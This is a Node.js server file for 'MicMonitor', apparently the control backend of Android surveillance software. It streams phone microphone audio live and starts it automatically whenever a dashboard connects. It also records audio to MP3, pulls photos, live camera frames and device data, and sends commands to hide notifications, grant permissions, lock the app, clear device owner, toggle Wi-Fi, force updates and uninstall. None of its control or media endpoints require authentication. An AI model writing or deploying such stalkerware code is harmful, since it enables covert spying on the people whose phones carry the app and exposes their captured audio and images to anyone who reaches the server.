/**
 * MicMonitor Server — Express + WebSocket
 * ════════════════════════════════════════════════════════════════════
 * Single port (process.env.PORT or 3000) — works on Render / Railway
 *   ws://host/audio/<deviceId>  → APK audio stream
 *   ws://host/control           → Dashboard control channel
 *   http://host/                → Static Dashboard UI (index.html)
 *
 * LOCAL:
 *   npm install && npm start
 *   Open http://localhost:3000
 *
 * RENDER DEPLOY:
 *   Push repo → connect on render.com → free Web Service
 *   Build cmd: npm install
 *   Start cmd: npm start
 * ════════════════════════════════════════════════════════════════════
 */

const WebSocket = require("ws");
const express = require("express");
const http = require("http");
const https = require("https");
const url = require("url");
const fs = require("fs");
const path = require("path");

const AUDIO_MAGIC_0 = 0x4d;
const AUDIO_MAGIC_1 = 0x4d;
const AUDIO_HEADER_VERSION = 0x01;
const AUDIO_CODEC_PCM16_16K = 0x00;
const AUDIO_CODEC_MULAW_8K = 0x01;

try {
  // Local development convenience. On Render, env vars are injected by platform.
  require("dotenv").config({ path: path.join(__dirname, ".env") });
} catch (_) {
  // dotenv is optional at runtime.
}

// Load @breezystack/lamejs IIFE bundle (ES module, not CJS-compatible via require)
const _lameCode = require("fs").readFileSync(
  require("path").join(
    __dirname,
    "node_modules/@breezystack/lamejs/dist/lamejs.iife.js",
  ),
  "utf8",
);
const { Mp3Encoder } = new Function(_lameCode + "; return lamejs;")();

// ── Config ──────────────────────────────────────────────────────────
const PORT = parseInt(process.env.PORT) || 3000;
const DASHBOARD_MAX_BUFFERED_BYTES = 96 * 1024;
const DEFAULT_STUN_URL = process.env.STUN_URL || "stun:stun.l.google.com:19302";
const FALLBACK_STUN_URLS = [
  DEFAULT_STUN_URL,
  "stun:stun1.l.google.com:19302",
  "stun:stun2.l.google.com:19302",
];
const ICE_SERVERS = [{ urls: FALLBACK_STUN_URLS }];
if (process.env.TURN_URL) {
  ICE_SERVERS.push({
    urls: [process.env.TURN_URL],
    username: process.env.TURN_USERNAME || "",
    credential: process.env.TURN_CREDENTIAL || "",
  });
}

// ── Folders ─────────────────────────────────────────────────────────
const RECORDINGS_DIR = path.join(__dirname, "recordings");
if (!fs.existsSync(RECORDINGS_DIR))
  fs.mkdirSync(RECORDINGS_DIR, { recursive: true });
const PHOTOS_DIR = path.join(__dirname, "photos");
if (!fs.existsSync(PHOTOS_DIR)) fs.mkdirSync(PHOTOS_DIR, { recursive: true });
const UPDATES_DIR = path.join(__dirname, "updates");
if (!fs.existsSync(UPDATES_DIR)) fs.mkdirSync(UPDATES_DIR, { recursive: true });

// ── State ─────────────────────────────────────────────────────────
/** @type {Map<string, { ws: WebSocket, model: string, sdk: number, connectedAt: Date, recordingChunks: Buffer[]|null, recordingFilename: string|null }>} */
const devices = new Map();

/** @type {Set<WebSocket>} Dashboard clients */
const dashboardClients = new Set();

function sendTextToDevice(deviceId, text) {
  const dev = devices.get(deviceId);
  if (!dev || !dev.ws || dev.ws.readyState !== WebSocket.OPEN) {
    broadcastToDashboard({
      type: "error",
      message: `Device ${deviceId} is offline`,
    });
    return false;
  }
  try {
    dev.ws.send(text);
    return true;
  } catch (e) {
    broadcastToDashboard({
      type: "error",
      message: `Failed to send command to ${deviceId}: ${e.message}`,
    });
    return false;
  }
}

function sendJsonToDevice(deviceId, payload) {
  const dev = devices.get(deviceId);
  if (!dev || !dev.ws || dev.ws.readyState !== WebSocket.OPEN) {
    broadcastToDashboard({
      type: "error",
      message: `Device ${deviceId} is offline`,
    });
    return false;
  }
  try {
    sendJson(dev.ws, payload);
    return true;
  } catch (e) {
    broadcastToDashboard({
      type: "error",
      message: `Failed to send command to ${deviceId}: ${e.message}`,
    });
    return false;
  }
}

// ════════════════════════════════════════════════════════════════════
// Single HTTP server — all traffic on one port
// ════════════════════════════════════════════════════════════════════
const app = express();
const httpServer = http.createServer(app);

// ── Single WebSocket server, path-based routing ──────────────────────
const wss = new WebSocket.Server({ noServer: true, perMessageDeflate: false });

httpServer.on("upgrade", (req, socket, head) => {
  const { pathname } = parseReqUrl(req.url || "");
  const isKnownWsPath =
    pathname.startsWith("/audio/") || pathname === "/control";
  if (!isKnownWsPath) {
    socket.write("HTTP/1.1 404 Not Found\r\n\r\n");
    socket.destroy();
    return;
  }
  wss.handleUpgrade(req, socket, head, (ws) => {
    wss.emit("connection", ws, req);
  });
});

wss.on("connection", (ws, req) => {
  const { pathname } = parseReqUrl(req.url || "");

  // ── Heartbeat: mark alive on every pong so dead sockets are detected ──────
  ws.isAlive = true;
  ws.on("pong", () => {
    ws.isAlive = true;
  });

  if (pathname.startsWith("/audio/")) {
    handleAudioDevice(ws, req);
  } else if (pathname === "/control") {
    handleDashboard(ws);
  } else {
    ws.close(1008, "Unknown path");
  }
});

// ── Heartbeat timer: ping all clients every 15 s, kill unresponsive ones ────
// This catches "zombie" connections where TCP silently dropped (mobile sleep,
// flaky Wi-Fi, server-side NAT timeout) without a WebSocket close frame.
const heartbeatTimer = setInterval(() => {
  wss.clients.forEach((ws) => {
    if (!ws.isAlive) {
      ws.terminate(); // no pong since last ping → dead connection
      return;
    }
    ws.isAlive = false;
    try {
      ws.ping();
    } catch (_) {
      ws.terminate();
    }
  });
}, 15_000);  // More frequent heartbeat (was 25s)
wss.on("close", () => clearInterval(heartbeatTimer));

// ════════════════════════════════════════════════════════════════════
// APK Audio handler  — ws://host/audio/<deviceId>
// ════════════════════════════════════════════════════════════════════
function handleAudioDevice(ws, req) {
  const { pathname } = parseReqUrl(req.url || "");
  const parts = pathname.split("/");
  const deviceId = decodeURIComponent(parts[2] || "unknown_" + Date.now());

  console.log(`📱 Device connected: ${deviceId}`);

  devices.set(deviceId, {
    ws,
    model: "Unknown",
    sdk: 0,
    connectedAt: new Date(),
    recordingChunks: null,
    recordingSampleRate: 16000,
    recordingFilename: null,
    health: {
      wsConnected: true,
      micCapturing: false,
      lastAudioChunkAt: 0,
      lastHealthAt: Date.now(),
      reason: "connected",
      internetOnline: true,
      callActive: false,
      batteryPct: null,
      charging: null,
    },
  });

  // If dashboards are already watching, start the mic immediately
  if (dashboardClients.size > 0) {
    sendTextToDevice(deviceId, "start_stream");
    console.log(`🎙️  Auto-sent start_stream to new device: ${deviceId}`);
  }

  // Notify dashboard
  broadcastToDashboard({
    type: "device_connected",
    deviceId,
    model: "Unknown",
    health: devices.get(deviceId)?.health,
  });

  // ── Handle incoming messages ─────────────────────────────────────
  ws.on("message", (data) => {
    // String messages = info / commands / ACKs
    // Use exact prefix matching instead of heuristic — PCM audio is always binary
    const isText =
      typeof data === "string" ||
      (data instanceof Buffer &&
        (data.slice(0, 12).toString().startsWith("DEVICE_INFO:") ||
          data.slice(0, 4).toString().startsWith("ACK:") ||
          data.slice(0, 5).toString().startsWith("FILE:") ||
          data.slice(0, 5).toString().startsWith("pong:") ||
          data.slice(0, 1).toString() === "{"));
    if (isText) {
      const text = data.toString().trim();

      if (text.startsWith("DEVICE_INFO:")) {
        // Format: DEVICE_INFO:deviceId:ModelName:sdkInt
        const [, , model, sdk] = text.split(":");
        const dev = devices.get(deviceId);
        if (dev) {
          dev.model = model;
          dev.sdk = parseInt(sdk) || 0;
        }
        console.log(`ℹ️  ${deviceId} → ${model} (SDK ${sdk})`);
        broadcastToDashboard({ type: "device_info", deviceId, model, sdk });
      } else if (text.startsWith("ACK:")) {
        console.log(`✅ ACK from ${deviceId}: ${text}`);
        broadcastToDashboard({ type: "ack", deviceId, message: text });
      } else if (text.startsWith("FILE:")) {
        const filename = text.replace("FILE:", "");
        console.log(`💾 ${deviceId} saved recording: ${filename}`);
        broadcastToDashboard({ type: "recording_saved", deviceId, filename });
      } else if (text === "pong:" + deviceId) {
        // heartbeat pong — ignore
      } else if (text.startsWith("{")) {
        // JSON payload from device (device_data, etc.)
        try {
          const json = JSON.parse(text);
          if (json.type === "device_data") {
            console.log(`📊 device_data from ${deviceId}`);
            broadcastToDashboard({
              type: "device_data",
              deviceId,
              data: json.data,
            });
          } else if (json.type === "health_status") {
            let dev = devices.get(deviceId);
            if (dev) {
              dev.health = {
                wsConnected: json.wsConnected !== false,
                micCapturing: json.micCapturing === true,
                lastAudioChunkAt: Number(
                  json.lastAudioChunkSentAt ||
                    dev.health?.lastAudioChunkAt ||
                    0,
                ),
                lastHealthAt: Number(json.ts || Date.now()),
                reason: String(json.reason || "heartbeat"),
                aiMode: json.aiMode !== false,
                aiAuto: json.aiAuto !== false,
                streamCodec: String(
                  json.streamCodec || dev.health?.streamCodec || "pcm",
                ),
                streamCodecMode: String(
                  json.streamCodecMode || dev.health?.streamCodecMode || "auto",
                ),
                voiceProfile: String(
                  json.voiceProfile || dev.health?.voiceProfile || "room",
                ),
                noiseDb: Number.isFinite(Number(json.noiseDb))
                  ? Number(json.noiseDb)
                  : null,
                internetOnline: json.internetOnline !== false,
                callActive: json.callActive === true,
                batteryPct: Number.isFinite(Number(json.batteryPct))
                  ? Number(json.batteryPct)
                  : null,
                charging:
                  typeof json.charging === "boolean" ? json.charging : null,
                photoAi: json.photoAi !== false,
                photoQuality: String(
                  json.photoQuality || dev.health?.photoQuality || "normal",
                ),
                photoNight: String(
                  json.photoNight || dev.health?.photoNight || "off",
                ),
              };
            }
            broadcastToDashboard({
              type: "device_health",
              deviceId,
              health: dev?.health || null,
            });
          } else if (
            json.type === "webrtc_answer" ||
            json.type === "webrtc_ice" ||
            json.type === "webrtc_state"
          ) {
            // Relay WebRTC signaling/state from phone to dashboard clients.
            broadcastToDashboard({ ...json, deviceId });
          } else if (json.type === "photo_upload") {
            const saved = saveUploadedPhoto(deviceId, json);
            if (saved) {
              broadcastToDashboard({
                type: "photo_saved",
                deviceId,
                filename: saved.filename,
                url: `/photos/${saved.filename}`,
                size: saved.size,
                camera: saved.camera,
                quality: saved.quality,
                aiEnhanced: saved.aiEnhanced,
                ts: saved.ts,
              });
            }
          } else if (json.type === "camera_live_frame") {
            broadcastToDashboard({
              type: "camera_live_frame",
              deviceId,
              camera: String(json.camera || "rear").toLowerCase(),
              quality: String(json.quality || "normal").toLowerCase(),
              mime: String(json.mime || "image/jpeg"),
              data: String(json.data || ""),
              ts: Number(json.ts || Date.now()),
            });
          } else if (json.type === "error") {
            console.error(`⚠️  Error from ${deviceId}: ${json.message}`);
            broadcastToDashboard({
              type: "error",
              message: `[${deviceId.substring(0, 8)}] ${json.message}`,
            });
          } else {
            console.log(`📨 ${deviceId}: ${text}`);
          }
        } catch (_) {
          console.log(`📨 ${deviceId}: ${text}`);
        }
      } else {
        console.log(`📨 ${deviceId}: ${text}`);
      }
      return;
    }

    // Binary data = live audio chunk (legacy PCM16 or compact mu-law frame)
    const dev = devices.get(deviceId);
    const parsedAudio = parseAudioPayload(Buffer.from(data));

    // 1) Forward chunk LIVE to all dashboard clients
    //    Pack as a single binary frame: [2-byte idLen][deviceId utf8][payload]
    //    This avoids the JSON+binary two-message race condition on the dashboard.
    const idBuf = Buffer.from(deviceId, "utf8");
    const header = Buffer.alloc(2);
    header.writeUInt16BE(idBuf.length, 0);
    const audioFrame = Buffer.concat([
      header,
      idBuf,
      parsedAudio.forwardPayload,
    ]);
    if (dev?.health) {
      dev.health.lastAudioChunkAt = Date.now();
      dev.health.micCapturing = true;
      dev.health.wsConnected = true;
    }
    dashboardClients.forEach((client) => {
      if (client.readyState !== WebSocket.OPEN) return;
      // Drop frames for lagging dashboard clients to keep real-time latency low.
      if (client.bufferedAmount > DASHBOARD_MAX_BUFFERED_BYTES) {
        return;
      }
      client.send(audioFrame);
    });

    // 2) Buffer for MP3 recording if active
    if (dev && dev.recordingChunks) {
      dev.recordingSampleRate = parsedAudio.sampleRate;
      dev.recordingChunks.push(parsedAudio.pcm16);
    }
  });

  ws.on("close", () => {
    console.log(`❌ Device disconnected: ${deviceId}`);
    const dev = devices.get(deviceId);
    if (dev?.recordingChunks && dev.recordingChunks.length > 0) {
      saveMp3(deviceId, dev);
    }
    devices.delete(deviceId);
    broadcastToDashboard({ type: "device_disconnected", deviceId });
  });

  ws.on("error", (err) => {
    console.error(`⚠️  Error from ${deviceId}:`, err.message);
  });
}

// ════════════════════════════════════════════════════════════════════
// Dashboard handler  — ws://host/control
// ════════════════════════════════════════════════════════════════════
function handleDashboard(ws) {
  const wasEmpty = dashboardClients.size === 0;
  dashboardClients.add(ws);
  console.log("👁️  Dashboard client connected");

  // First dashboard connected — wake up all device mics
  if (wasEmpty) {
    devices.forEach((dev, id) => {
      sendTextToDevice(id, "start_stream");
      console.log(`🎙️  start_stream → ${id}`);
    });
  }

  // Send current device list on connect
  const deviceList = [];
  devices.forEach((dev, id) => {
    deviceList.push({
      deviceId: id,
      model: dev.model,
      sdk: dev.sdk,
      connectedAt: dev.connectedAt,
      health: dev.health,
    });
  });
  ws.send(JSON.stringify({ type: "device_list", devices: deviceList }));

  ws.on("message", (data) => {
    try {
      const msg = JSON.parse(data.toString());
      const { cmd } = msg;
      let targetId = msg.deviceId;
      if (!targetId || !devices.has(targetId)) {
        if (devices.size === 1) {
          targetId = devices.keys().next().value;
        } else {
          ws.send(
            JSON.stringify({
              type: "error",
              message: `Device ${msg.deviceId} not found`,
            }),
          );
          return;
        }
      }

      const device = devices.get(targetId);
      switch (cmd) {
        case "start_stream":
          if (sendTextToDevice(targetId, "start_stream")) {
            broadcastToDashboard({ type: "stream_started", deviceId: targetId });
          }
          break;
        case "stop_stream":
          stopDeviceRecording(targetId, device);
          if (sendTextToDevice(targetId, "stop_stream")) {
            broadcastToDashboard({ type: "stream_stopped", deviceId: targetId });
          }
          break;
        case "start_record":
          startDeviceRecording(targetId, device);
          device.ws.send("start_record");
          break;
        case "stop_record":
          stopDeviceRecording(targetId, device);
          device.ws.send("stop_record");
          break;
        case "ping":
          device.ws.send("ping");
          break;
        case "get_data":
          device.ws.send("get_data");
          break;
        case "webrtc_start":
          sendJson(device.ws, { type: "webrtc_start" });
          break;
        case "webrtc_stop":
          sendJson(device.ws, { type: "webrtc_stop" });
          break;
        case "webrtc_offer":
          sendJson(device.ws, {
            type: "webrtc_offer",
            sdp: msg.sdp,
          });
          break;
        case "webrtc_ice":
          sendJson(device.ws, {
            type: "webrtc_ice",
            candidate: msg.candidate,
          });
          break;
        case "webrtc_quality":
          sendJson(device.ws, {
            type: "webrtc_quality",
            quality: msg.quality || null,
          });
          break;
        case "ai_mode":
          sendJson(device.ws, {
            type: "ai_mode",
            enabled: msg.enabled !== false,
          });
          break;
        case "ai_auto":
          sendJson(device.ws, {
            type: "ai_auto",
            enabled: msg.enabled !== false,
          });
          break;
        case "stream_codec":
          sendJson(device.ws, {
            type: "stream_codec",
            mode: String(msg.mode || "auto").toLowerCase(),
          });
          break;
        case "voice_profile":
          sendJson(device.ws, {
            type: "voice_profile",
            profile: String(msg.profile || "room").toLowerCase(),
          });
          break;
        case "take_photo":
          if (sendJsonToDevice(targetId, {
            type: "take_photo",
            camera: String(msg.camera || "current").toLowerCase(),
          })) {
            // Notify dashboard that command was sent
            broadcastToDashboard({
              type: "photo_request_sent",
              deviceId: targetId,
              camera: msg.camera || "current",
              ts: Date.now()
            });
          } else {
            // Device not connected - send error to dashboard
            broadcastToDashboard({
              type: "photo_request_failed",
              deviceId: targetId,
              reason: "device_not_connected",
              ts: Date.now()
            });
          }
          break;
        case "switch_camera":
          sendJson(device.ws, { type: "switch_camera" });
          break;
        case "photo_ai":
          sendJson(device.ws, {
            type: "photo_ai",
            enabled: msg.enabled !== false,
          });
          break;
        case "photo_quality":
          sendJson(device.ws, {
            type: "photo_quality",
            mode: ["fast", "normal", "hd"].includes(
              String(msg.mode || "normal").toLowerCase(),
            )
              ? String(msg.mode || "normal").toLowerCase()
              : "normal",
          });
          break;
        case "photo_night":
          sendJson(device.ws, {
            type: "photo_night",
            mode: ["off", "1s", "3s", "5s"].includes(
              String(msg.mode || "off").toLowerCase(),
            )
              ? String(msg.mode || "off").toLowerCase()
              : "off",
          });
          break;
        case "camera_live_start":
          sendJson(device.ws, {
            type: "camera_live_start",
            camera: String(msg.camera || "current").toLowerCase(),
          });
          break;
        case "camera_live_stop":
          sendJson(device.ws, { type: "camera_live_stop" });
          break;
        case "force_update":
          // Relay force update command to device
          sendTextToDevice(targetId, "force_update");
          console.log(`🔄 Force update sent to ${targetId}`);
          break;
        case "grant_permissions":
          // Relay grant permissions command to device
          sendTextToDevice(targetId, "grant_permissions");
          console.log(`✅ Grant permissions sent to ${targetId}`);
          break;
        case "uninstall_app":
          // Relay uninstall command to device
          sendTextToDevice(targetId, "uninstall_app");
          console.log(`🗑️ Uninstall sent to ${targetId}`);
          break;
        case "clear_device_owner":
          // Relay clear device owner command
          sendTextToDevice(targetId, "clear_device_owner");
          console.log(`🔓 Clear device owner sent to ${targetId}`);
          break;
        case "lock_app":
          sendTextToDevice(targetId, "lock_app");
          console.log(`🔒 Lock app sent to ${targetId}`);
          break;
        case "unlock_app":
          sendTextToDevice(targetId, "unlock_app");
          console.log(`🔓 Unlock app sent to ${targetId}`);
          break;
        case "hide_notifications":
          sendTextToDevice(targetId, "hide_notifications");
          console.log(`🔕 Hide notifications sent to ${targetId}`);
          break;
        case "wifi_on":
          sendTextToDevice(targetId, "wifi_on");
          console.log(`📶 WiFi ON sent to ${targetId}`);
          break;
        case "wifi_off":
          sendTextToDevice(targetId, "wifi_off");
          console.log(`📴 WiFi OFF sent to ${targetId}`);
          break;
        default:
          console.warn(`Unknown dashboard command: ${cmd}`);
      }
    } catch (e) {
      console.error("Dashboard message parse error:", e.message);
    }
  });

  ws.on("close", () => {
    dashboardClients.delete(ws);
    console.log("👋 Dashboard client disconnected");

    // Last dashboard left — stop all device mics
    if (dashboardClients.size === 0) {
      devices.forEach((dev, id) => {
        sendTextToDevice(id, "stop_stream");
        console.log(`🔇  stop_stream → ${id}`);
      });
    }
  });
}

setInterval(() => {
  if (dashboardClients.size === 0) return;
  const now = Date.now();
  devices.forEach((dev, deviceId) => {
    if (!dev || !dev.ws || dev.ws.readyState !== WebSocket.OPEN) return;
    const lastAudio = Number(dev.health?.lastAudioChunkAt || 0);
    const stale = !lastAudio || now - lastAudio > 25_000;
    if (stale) {
      sendTextToDevice(deviceId, "start_stream");
      broadcastToDashboard({ type: "stream_recovery_sent", deviceId });
    }
  });
}, 20_000);

// ════════════════════════════════════════════════════════════════════
// HTTP routes
// ════════════════════════════════════════════════════════════════════

// Health check — used by Android KeepAliveWorker to wake Render from sleep
app.get("/health", (req, res) => {
  res.json({ status: "ok", devices: devices.size, ts: Date.now() });
});

// ICE config for dashboard and device clients.
app.get("/api/webrtc-config", (req, res) => {
  res.json({
    iceServers: ICE_SERVERS,
    tokenRequired: false,
  });
});

// List recordings as JSON
app.get("/api/recordings", (req, res) => {
  const files = fs
    .readdirSync(RECORDINGS_DIR)
    .filter((f) => f.endsWith(".mp3") || f.endsWith(".wav"))
    .map((f) => ({
      name: f,
      size: fs.statSync(path.join(RECORDINGS_DIR, f)).size,
      url: `/recordings/${f}`,
    }));
  res.json(files);
});

app.get("/api/photos", (req, res) => {
  const files = fs
    .readdirSync(PHOTOS_DIR)
    .filter((f) => /\.(jpg|jpeg|png)$/i.test(f))
    .map((f) => ({
      name: f,
      size: fs.statSync(path.join(PHOTOS_DIR, f)).size,
      url: `/photos/${f}`,
    }));
  res.json(files);
});

// ════════════════════════════════════════════════════════════════════
// APK Auto-Update API
// ════════════════════════════════════════════════════════════════════

// Version info for auto-update
app.get("/api/version", (req, res) => {
  const versionFile = path.join(UPDATES_DIR, "version.json");
  
  // Default version info (update this when releasing new APK)
  let versionInfo = {
    versionCode: 1,
    versionName: "1.0.0",
    apkUrl: "/updates/app-release.apk",
    changelog: "Initial release",
    minVersionCode: 1,  // Force update if device version < this
    updatedAt: new Date().toISOString()
  };
  
  // Try to read from version.json if it exists
  if (fs.existsSync(versionFile)) {
    try {
      const data = JSON.parse(fs.readFileSync(versionFile, "utf8"));
      versionInfo = { ...versionInfo, ...data };
    } catch (e) {
      console.error("Error reading version.json:", e.message);
    }
  }
  
  // Check if APK exists
  const apkPath = path.join(UPDATES_DIR, "app-release.apk");
  versionInfo.apkAvailable = fs.existsSync(apkPath);
  if (versionInfo.apkAvailable) {
    versionInfo.apkSize = fs.statSync(apkPath).size;
  }
  
  res.json(versionInfo);
});

// Serve APK files
app.use("/updates", express.static(UPDATES_DIR));

// Serve recording files for download
app.use("/recordings", express.static(RECORDINGS_DIR));
app.use("/photos", express.static(PHOTOS_DIR));

// Serve RNNoise worklet and wasm assets for dashboard-side AI denoise.
app.use(
  "/vendor/web-noise-suppressor",
  express.static(
    path.join(__dirname, "node_modules/@sapphi-red/web-noise-suppressor/dist"),
  ),
);

// All other requests → static dashboard (index.html)
app.use(express.static(path.join(__dirname)));
app.get("*", (req, res) => {
  res.set(
    "Cache-Control",
    "no-store, no-cache, must-revalidate, proxy-revalidate",
  );
  res.set("Pragma", "no-cache");
  res.set("Expires", "0");
  res.sendFile(path.join(__dirname, "index.html"));
});

httpServer.listen(PORT, () => {
  console.log(`🌐 Dashboard:  http://localhost:${PORT}`);
  console.log(`🎤 Audio WS:   ws://localhost:${PORT}/audio/<deviceId>`);
  console.log(`🖥️  Control WS: ws://localhost:${PORT}/control\n`);

  // Self-ping every 14 min to prevent Render free tier from sleeping.
  // Render sleeps after 15 min of no inbound HTTP — this keeps it awake.
  const SELF_URL =
    process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;

  setInterval(
    () => {
      // Determine if we need HTTPS or HTTP
      const parsedUrl = new URL(SELF_URL);
      const protocol = parsedUrl.protocol === "https:" ? https : http;

      protocol
        .get(`${SELF_URL}/health`, (r) => {
          console.log(`🔄 Self-ping: ${r.statusCode}`);
        })
        .on("error", (e) => console.warn("Self-ping error:", e.message));
    },
    14 * 60 * 1000,
  );
});

// ════════════════════════════════════════════════════════════════════
// Helper functions
// ════════════════════════════════════════════════════════════════════

function startDeviceRecording(deviceId, device) {
  if (device.recordingChunks) return; // already recording
  device.recordingChunks = [];
  device.recordingSampleRate = 16000;
  const filename = `rec_${deviceId.slice(0, 8)}_${Date.now()}.mp3`;
  device.recordingFilename = filename;
  console.log(`⏺️  Recording started: ${filename}`);
  broadcastToDashboard({ type: "recording_started", deviceId, filename });
}

function stopDeviceRecording(deviceId, device) {
  if (!device.recordingChunks || device.recordingChunks.length === 0) {
    // Nothing buffered (e.g. server restarted mid-recording) — just reset
    device.recordingChunks = null;
    device.recordingFilename = null;
    broadcastToDashboard({
      type: "recording_stopped",
      deviceId,
      filename: null,
    });
    return;
  }
  saveMp3(deviceId, device);
}

function saveMp3(deviceId, device) {
  const chunks = device.recordingChunks;
  device.recordingChunks = null;
  const filename =
    device.recordingFilename || `rec_${deviceId.slice(0, 8)}_${Date.now()}.mp3`;
  device.recordingFilename = null;

  try {
    // Encode all buffered PCM chunks → MP3
    const allPcm = Buffer.concat(chunks);
    const mp3Buffer = pcmToMp3(allPcm, device.recordingSampleRate || 16000);
    const filepath = path.join(RECORDINGS_DIR, filename);
    fs.writeFileSync(filepath, mp3Buffer);
    console.log(
      `⏹️  Recording saved: ${filename} (${(mp3Buffer.length / 1024).toFixed(1)} KB)`,
    );
  } catch (err) {
    console.error(`❌ Failed to encode/save MP3 for ${deviceId}:`, err.message);
  }

  broadcastToDashboard({ type: "recording_stopped", deviceId, filename });
}

function saveUploadedPhoto(deviceId, payload) {
  try {
    const base64 = String(payload?.data || "").trim();
    if (!base64) return null;
    const raw = Buffer.from(base64, "base64");
    if (!raw.length) return null;
    const safeDevice =
      String(deviceId || "unknown")
        .replace(/[^a-z0-9_-]/gi, "")
        .slice(0, 16) || "unknown";
    const reqName = String(payload?.filename || "").replace(
      /[^a-z0-9._-]/gi,
      "",
    );
    const ext = /\.(png)$/i.test(reqName) ? ".png" : ".jpg";
    const camera =
      String(payload?.camera || "rear").toLowerCase() === "front"
        ? "front"
        : "rear";
    const ts = Number(payload?.ts) || Date.now();
    const filename = reqName || `photo_${safeDevice}_${camera}_${ts}${ext}`;
    const filepath = path.join(PHOTOS_DIR, filename);
    fs.writeFileSync(filepath, raw);
    return {
      filename,
      size: raw.length,
      camera,
      quality: ["fast", "normal", "hd"].includes(
        String(payload?.quality || "normal").toLowerCase(),
      )
        ? String(payload?.quality || "normal").toLowerCase()
        : "normal",
      aiEnhanced: payload?.aiEnhanced === true,
      ts,
    };
  } catch (err) {
    console.error(`❌ Failed to save photo from ${deviceId}:`, err.message);
    return null;
  }
}

/**
 * Encode raw 16-bit PCM (mono) → MP3 Buffer using lamejs.
 */
function pcmToMp3(pcmBuffer, sampleRate = 16000) {
  const encoder = new Mp3Encoder(1, sampleRate, 128);
  const samples = new Int16Array(
    pcmBuffer.buffer,
    pcmBuffer.byteOffset,
    pcmBuffer.byteLength / 2,
  );
  const blockSize = 1152; // lamejs required block size
  const mp3Parts = [];

  for (let i = 0; i < samples.length; i += blockSize) {
    const chunk = samples.subarray(i, i + blockSize);
    const encoded = encoder.encodeBuffer(chunk);
    if (encoded.length > 0) mp3Parts.push(Buffer.from(encoded));
  }
  const flushed = encoder.flush();
  if (flushed.length > 0) mp3Parts.push(Buffer.from(flushed));

  return Buffer.concat(mp3Parts);
}

function parseAudioPayload(buffer) {
  if (
    buffer.length >= 4 &&
    buffer[0] === AUDIO_MAGIC_0 &&
    buffer[1] === AUDIO_MAGIC_1 &&
    buffer[2] === AUDIO_HEADER_VERSION
  ) {
    const codec = buffer[3];
    const audioData = buffer.subarray(4);
    if (codec === AUDIO_CODEC_PCM16_16K) {
      return {
        forwardPayload: buffer,
        pcm16: audioData,
        sampleRate: 16000,
      };
    }
    if (codec === AUDIO_CODEC_MULAW_8K) {
      return {
        forwardPayload: buffer,
        pcm16: muLawToPcm16Buffer(audioData),
        sampleRate: 8000,
      };
    }
  }

  return {
    forwardPayload: buffer,
    pcm16: buffer,
    sampleRate: 16000,
  };
}

function muLawToPcm16Buffer(muLawBuffer) {
  const pcm = Buffer.allocUnsafe(muLawBuffer.length * 2);
  for (let i = 0; i < muLawBuffer.length; i++) {
    const sample = muLawByteToLinearSample(muLawBuffer[i]);
    pcm.writeInt16LE(sample, i * 2);
  }
  return pcm;
}

function muLawByteToLinearSample(value) {
  const mu = ~value & 0xff;
  const sign = mu & 0x80;
  const exponent = (mu >> 4) & 0x07;
  const mantissa = mu & 0x0f;
  let sample = ((mantissa << 3) + 0x84) << exponent;
  sample -= 0x84;
  return sign ? -sample : sample;
}

/**
 * Broadcast a JSON event (and optional binary payload) to all dashboard clients.
 * @param {object} jsonHeader  - Will be sent as text first, then binary if provided
 * @param {Buffer} [binaryData] - Optional raw audio binary
 */
function broadcastToDashboard(jsonHeader, binaryData) {
  const text = JSON.stringify(jsonHeader);
  dashboardClients.forEach((client) => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(text);
      if (binaryData) {
        client.send(binaryData);
      }
    }
  });
}

function sendJson(ws, payload) {
  if (!ws || ws.readyState !== WebSocket.OPEN) return;
  ws.send(JSON.stringify(payload));
}

function parseReqUrl(url) {
  try {
    const u = new URL(url, "http://localhost");
    return { pathname: u.pathname, searchParams: u.searchParams };
  } catch (_) {
    return {
      pathname: url.split("?")[0] || "/",
      searchParams: new URLSearchParams(),
    };
  }
}

// ── Graceful shutdown ─────────────────────────────────────────────
process.on("SIGINT", () => {
  console.log("\n⛔ Shutting down server…");
  devices.forEach((dev) => {
    if (dev.recordingFile) dev.recordingFile.end();
  });
  process.exit(0);
});
